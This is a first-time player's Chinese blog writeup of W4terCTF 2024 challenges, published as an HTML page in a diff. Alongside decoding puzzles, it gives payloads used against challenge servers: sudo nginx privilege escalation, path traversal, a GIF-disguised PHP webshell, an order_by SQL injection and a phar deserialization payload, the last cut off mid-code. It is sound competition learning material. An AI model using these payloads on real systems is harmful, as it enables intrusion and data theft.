@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"47.120.40.107","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言这是我第一次参加 CTF 竞赛，感觉还是很好玩的，也很有收获由于本人是第一次参加CTF比赛，所以一开始不知道得到flag需要截图，所以有些题目没有flag截图，一些流程的图片也没有截到。但是我会尽量将思路讲清楚的 WriteupMISCbroken.mp4该题使用untrunc软件，以下载附件得到的第一个视频为reference file，以第二个视频为truncate file，生成第二个视">
+<meta property="og:type" content="article">
+<meta property="og:title" content="W4terCTF 2024 Writeup">
+<meta property="og:url" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/index.html">
+<meta property="og:site_name" content="黄梓铭 (Ivan Wong)">
+<meta property="og:description" content="前言这是我第一次参加 CTF 竞赛，感觉还是很好玩的，也很有收获由于本人是第一次参加CTF比赛，所以一开始不知道得到flag需要截图，所以有些题目没有flag截图，一些流程的图片也没有截到。但是我会尽量将思路讲清楚的 WriteupMISCbroken.mp4该题使用untrunc软件，以下载附件得到的第一个视频为reference file，以第二个视频为truncate file，生成第二个视">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/broken.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Signin.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Priv1.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Priv2.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Priv3.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Priv4.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Priv5.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Priv6.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Priv7.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Priv8.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/GZ1.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/GZ2.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Spam1.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/PNG1.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/PNG2.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Auto1.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Auto2.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Auto3.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Shuffle.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe1.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe2.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe3.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe4.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Wish1.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Wish2.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Wish3.png">
+<meta property="og:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/Wish4.png">
+<meta property="article:published_time" content="2024-04-29T01:36:19.000Z">
+<meta property="article:modified_time" content="2024-04-29T04:19:59.055Z">
+<meta property="article:author" content="黄梓铭">
+<meta property="article:tag" content="C&#x2F;C++, C#, Go, 算法, 游戏">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/broken.png">
+
+<link rel="canonical" href="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>W4terCTF 2024 Writeup | 黄梓铭 (Ivan Wong)</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">黄梓铭 (Ivan Wong)</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">8</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://47.120.40.107/2024/04/29/W4terCTF_2024_Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/MyPhoto.jpg">
+      <meta itemprop="name" content="黄梓铭">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="黄梓铭 (Ivan Wong)">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          W4terCTF 2024 Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-04-29 09:36:19 / 修改时间：12:19:59" itemprop="dateCreated datePublished" datetime="2024-04-29T09:36:19+08:00">2024-04-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AB%9E%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">竞赛</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AB%9E%E8%B5%9B/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>13k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>12 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2><span id="前言">前言</span></h2><p>这是我第一次参加 <em>CTF</em> 竞赛，感觉还是很好玩的，也很有收获<br>由于本人是第一次参加CTF比赛，所以一开始不知道得到flag需要截图，所以有些题目没有flag截图，一些流程的图片也没有截到。但是我会尽量将思路讲清楚的</p>
+<h2><span id="writeup">Writeup</span></h2><h3><span id="misc">MISC</span></h3><h4><span id="brokenmp4">broken.mp4</span></h4><p>该题使用untrunc软件，以下载附件得到的第一个视频为reference file，以第二个视频为truncate file，生成第二个视频的修复视频，在视频的最后就可以获得flag</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/broken.png" class>
+
+<h4><span id="sign-in">Sign in</span></h4><p>该题通过在榜单寻找W4terDr0p队伍，即可获得flag</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Signin.png" class>
+<h4><span id="priv-escape">Priv Escape</span></h4><p>通过sudo -l 可以发现，&#x2F;usr&#x2F;sbin&#x2F;nginx对于当前用户，是被r00t赋权执行的，这就是本题的突破口。那么，解题的流程就应该是：通过r00t开启nginx服务，暴露一个端口，当前用户在访问这个端口的时候，可以通过该端口获取flag<br>具体流程：<br>直接开启nginx肯定是不可行的，关注到nginx的启动命令，可以通过-c 指定nginx.conf的路径。所以要先自己写一个nginx.conf，内容如下（只截取重要部分）：</p>
+<p>这里要指定pid的路径，a.pid是自己创建的，而且这个pid的值需要先通过sudo -u r00t &#x2F;usr&#x2F;sbin&#x2F;nginx启动nginx，并用ps -ef | grep nginx 获取到（此处为120），再通过echo输入到a.pid</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv1.png" class>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv2.png" class>
+
+<p>这些都要指定到可以访问的目录，否则会报错</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv3.png" class>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv4.png" class>
+
+<p>所有的include 也要注释掉，不然会报错</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv5.png" class>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv6.png" class>
+
+<p>此处暴露18888端口供当前用户访问</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv7.png" class>
+
+<p>tips：所有的文件创建都可以通过touch + echo 的方式写入，如果写错了，就rm后重写</p>
+<p>然后就可以通过sudo -u r00t &#x2F;usr&#x2F;sbin&#x2F;nginx -c &#x2F;home&#x2F;W4terCTFPlayer&#x2F;nginx.conf 开启nginx服务<br>tips：在此之前，要确定&#x2F;home&#x2F;W4terCTFPlayer下的所有文件可读，可以通过 chmod -R 777  &#x2F;home&#x2F;W4terCTFPlayer 实现</p>
+<p>最后，就可以通过curl 127.0.0.1:18888 访问到flag啦</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv8.png" class>
+
+<h4><span id="gz-gpt">GZ GPT</span></h4><p>一开始真的是一点头绪没有，只知道flag、CTF输入的时候会有不一样的回答，然后就一直卡在这。<br>然后后面有出现的这些“东西”，我真的有一大段时间认为是乱码！！！因为我用cmd的时候会有乱码出现，然后一直没有管（啊啊啊救命）</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/GZ1.png" class>
+
+<p>实际上认真观察之后可以发现，这里是有两种图案，而且有八个，所以就能联想到是八位二进制<br>那么我们可以验证一下，发现第一第二个二进制转ASCII 后就是W4，就可以确认是正确的解答方法了<br>然后不断发请求，会发现过了一轮有一句话是没有符号的，说明已经到结尾了。这时就可以将这些二进制数输入转换器，得到以下结果</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/GZ2.png" class>
+
+<h4><span id="spam-2024">Spam 2024</span></h4><p>首先拿到一个很长的垃圾邮件，很容易想到是Spam Encode生成的，Decode 后得到如下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">59,6f,75,20,6c,69,6b,65,20,65,6d,6f,6a,69,73,2c,20,64,6f,6e,27,74,20,79,6f,75,3f,0a,0a,01f643,01f4b5,01f33f,01f3a4,01f6aa,01f30f,01f40e,01f94b,01f6ab,01f606,2705,01f606,01f6b0,01f4c2,01f32a,263a,01f6e9,01f30f,01f4c2,01f579,01f993,01f405,01f375,01f388,01f600,01f504,01f6ab,01f3a4,01f993,2705,01f4ee,01f3a4,01f385,01f34e,01f643,01f309,01f383,01f34d,01f374,01f463,01f6b9,01f923,01f418,01f3f9,263a,01f463,01f4a7,01f463,01f993,01f33f,2328,01f32a,01f30f,01f643,01f375,2753,2602,01f309,01f606,01f3f9,01f375,01f4a7,01f385,01f449,01f30a,01f6b9,01f6aa,01f374,01f60e,01f383,01f32a,01f643,01f441,01f94b,01f451,01f4a7,01f418,01f3a4,01f94b,01f418,01f6e9,01f923,01f309,01f6e9,23e9,01f60d,2753,01f418,01f621,2600,01f60d,01f643,01f601,01f600,01f601,01f6ab,01f4c2,2705,2603,01f6ab,01f60e,01f52a,01f451,01f600,01f579,01f6ab,01f60d,01f32a,01f4c2,01f44c,01f34d,01f44c,01f993,01f590,01f923,01f60e,01f3ce,01f34d,01f3f9,01f34c,01f34d,01f3a4,2600,01f3f9,01f388,01f6b0,01f4a7,2600,2709,01f3f9,01f34d,01f993,01f385,01f374,2602,23e9,01f6aa,01f40d,263a,01f418,01f607,01f621,01f375,01f30f,01f993,01f375,01f6e9,01f4c2,01f44c,01f3f9,01f5d2,01f5d2,0a,0a,42,74,77,2c,20,74,68,65,20,6b,65,79,20,69,73,20,22,4b,45,59,22</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这里面包含了两种编码，一种是59形式 ，另一种是01f643 形式，第一种很容易看出是十六进制，所以放到 CyberChef 中解码得到如下内容：</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Spam1.png" class>
+
+<p>根据提示，第二种形式的编码应该是 emoji 的 Unicode 编码，所以我写了一个小程序对其进行转换</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_to_emoji</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 将输入的unicode字符串按逗号分割成列表</span></span><br><span class="line">    unicode_list = input_string.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个空列表，用于存储转换后的emoji</span></span><br><span class="line">    emoji_list = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历unicode列表，将每个unicode转换为对应的emoji，并加入到emoji列表中</span></span><br><span class="line">    <span class="keyword">for</span> unicode_char <span class="keyword">in</span> unicode_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            emoji_char = <span class="built_in">chr</span>(<span class="built_in">int</span>(unicode_char.strip(), <span class="number">16</span>))</span><br><span class="line">            emoji_list.append(emoji_char)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Invalid Unicode: <span class="subst">&#123;unicode_char.strip()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回逗号分隔的转换后的emoji字符串</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(emoji_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">unicode_input = <span class="built_in">input</span>(<span class="string">&quot;请输入以逗号分隔的Unicode字符串：&quot;</span>)</span><br><span class="line">emoji_output = unicode_to_emoji(unicode_input)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的Emoji字符串为：&quot;</span>, emoji_output)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅😆🚰📂🌪☺🛩🌏📂🕹🦓🐅🍵🎈😀🔄🚫🎤🦓✅📮🎤🎅🍎🙃🌉🎃🍍🍴👣🚹🤣🐘🏹☺👣💧👣🦓🌿⌨🌪🌏🙃🍵❓☂🌉😆🏹🍵💧🎅👉🌊🚹🚪🍴😎🎃🌪🙃👁🥋👑💧🐘🎤🥋🐘🛩🤣🌉🛩⏩😍❓🐘😡☀😍🙃😁😀😁🚫📂✅☃🚫😎🔪👑😀🕹🚫😍🌪📂👌🍍👌🦓🖐🤣😎🏎🍍🏹🍌🍍🎤☀🏹🎈🚰💧☀✉🏹🍍🦓🎅🍴☂⏩🚪🐍☺🐘😇😡🍵🌏🦓🍵🛩📂👌🏹🗒🗒</span><br></pre></td></tr></table></figure>
+
+<p>这个编码也能比较容易看出，就是emoji-AES编码（emoji-AES编码的开头和结尾是有一定格式的）<br>那么关键就在于密钥，提示中说了密钥为KEY，但是解密一直在报错，奇怪了！密文大概率是没有错误的，也没有其他提示密文要做进一步变换，那么难道是密钥的问题吗？<br>这里出题人给我们挖了一个“小”坑，那就是 KEY 并不是密钥，🔑才是，因为 “I like emoji” 😂<br>解密成功得到如下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x???? ⊕ dxBUQVJndGJbbGByE3tGUW57VxV0bH9db3FSe2YFUndUexVUYWl/QW1FAW1/bW57EhQSEF0=</span><br></pre></td></tr></table></figure>
+
+<p>这里的提示倒是蛮明显的，左边是一个4位16进制数，中间是异或，右边是类似于base64的编码。既然只是4位16进制，那么最大也就65536，完全可以爆破得出明文。<br>所以写个代码把所有可能结果输出，然后找就好啦</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 编码的字符串</span></span><br><span class="line">encoded_data = <span class="string">&#x27;dxBUQVJndGJbbGByE3tGUW57VxV0bH9db3FSe2YFUndUexVUYWl/QW1FAW1/bW57EhQSEF0=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有可能的0x0000到0xFFFF（65535）</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10000</span>):</span><br><span class="line">    <span class="comment"># 将整数i转化为两字节形式</span></span><br><span class="line">    key = i.to_bytes(<span class="number">2</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建用于XOR操作的完整密钥，重复匹配数据长度</span></span><br><span class="line">    full_key = key * (<span class="built_in">len</span>(decoded_bytes) // <span class="built_in">len</span>(key)) + key[:<span class="built_in">len</span>(decoded_bytes) % <span class="built_in">len</span>(key)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># XOR解密</span></span><br><span class="line">    xored_result = <span class="built_in">bytes</span>([b ^ k <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(decoded_bytes, full_key)])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 尝试解码为字符串，检查是否有意义的输出（ASCII可打印字符）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_text = xored_result.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        <span class="comment"># 打印可能有意义的结果，并且第一个字符为W，第二个字符为4</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="number">126</span> <span class="keyword">or</span> c <span class="keyword">in</span> <span class="string">&#x27;\r\n\t&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> decoded_text) <span class="keyword">and</span> decoded_text[<span class="number">0</span>] == <span class="string">&#x27;W&#x27;</span> <span class="keyword">and</span> decoded_text[<span class="number">1</span>] == <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Key <span class="subst">&#123;i:04x&#125;</span>:&#x27;</span>, decoded_text)</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="comment"># 如果无法解码为ASCII，忽略错误</span></span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+<p>得出明文如下：<br><code>Key 2420: W4terCTF&#123;H@V3_fuN_w1TH_yOUr_F!rSt_5pAM_eMa!I_IN_2024&#125;</code></p>
+<h3><span id="pwn">Pwn</span></h3><h4><span id="remember-it-0">Remember It 0</span></h4><p>该题通过访问容器，连续答对10个string后，获得shell，ls发现目录中有flag，再用cat flag 命令得到flag</p>
+<h3><span id="web">Web</span></h3><h4><span id="gitzip">GitZip</span></h4><p>本题用到burp抓包，在routes.js文件中发现其中aget(‘&#x2F;:htmlname’) 可以穿透攻击，将htmlname设为..&#x2F;就可以访问到父级目录，通过这个方法，在&#x2F;tmp&#x2F;flag前面不断加..&#x2F;，一层一层往上测试（在哪一层我忘记了，当时没有截图），用burp发送Get请求报文，就能在响应报文中找到flag了。<br>这里有个要注意的点是url必须通过编码再发送请求，否则无法找到flag。</p>
+<h4><span id="png-server">PNG Server</span></h4><p>首先用.txt写一个一句话木马，在文件头部加上GIF87a，这样就能识别为gif，可以成功上传<br>然后，注意到php.ini中有cgi.fix_pathinfo&#x3D;1 这么一句话。<br>cgi.fix_pathinfo的解释如下：<br>该选项位于配置文件php.ini中，默认值为1，表示开启。当php遇到文件路径&#x2F;test.png&#x2F;x.php时，若&#x2F;test.png&#x2F;x.php不存在，则会去掉最后的&#x2F;x.php，然后判断&#x2F;test.png是否存在，若存在，则把&#x2F;test.png当做文件&#x2F;test.png&#x2F;x.php解析，如若test.png还不存在如果在其前面还有后缀，继续前面的步骤，以此类推。若是关闭该选项，访问&#x2F;test.jpg&#x2F;x.php 只会返回找不到文件。</p>
+<p>所以，上传图片后，用burp抓到响应报文，获取到图片的位置，再使用蚁剑连接，配置如下：<br>利用上面提到的性质，只需要在.png后面再添加 &#x2F;任意名字.php，这样图片马就能被当成php执行了</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/PNG1.png" class>
+
+<p>连接成功后，回到父级目录，就能找到&#x2F;flag</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/PNG2.png" class>
+
+<h4><span id="user-manager">User Manager</span></h4><p>该题在查看main.go的时候，发现在order_by字段作sql注入。<br>首先通过burp抓到一个正常的Get &#x2F;users包，通过修改order_by&#x3D; 后的字段，猜出名字的列名是Name和密码的列名是Secret，然后猜想数据表名叫users，经过测试发现没有问题。<br>然后将order_by&#x3D; 后的字段改为以下语句<br><code>Secret; INSERT INTO users (Name) SELECT Secret FROM users;</code><br>意思是将Secret列的内容全部覆盖Name列内容<br>经过编码后是<br><code>Secret%3B%20INSERT%20INTO%20users%20(Name)%20SELECT%20Secret%20FROM%20users%3B</code><br>这样在响应报文中就会发现，Name字段中出现了flag</p>
+<h4><span id="auto-unserialize">Auto Unserialize</span></h4><p>这是一个反序列化的题，在访问到的php代码中发现file_exist的参数是可以人为指定的</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Auto1.png" class>
+
+<p>而且，对于文件的上传也没有很强的检测，只是判断是不是jpg<br>所以可以用 phar反序列化，构造一个 伪装成jpg的 .phar文件，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">command_test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">command_test</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>); <span class="comment">//生成一个phar文件，文件名为shell.phar</span></span><br><span 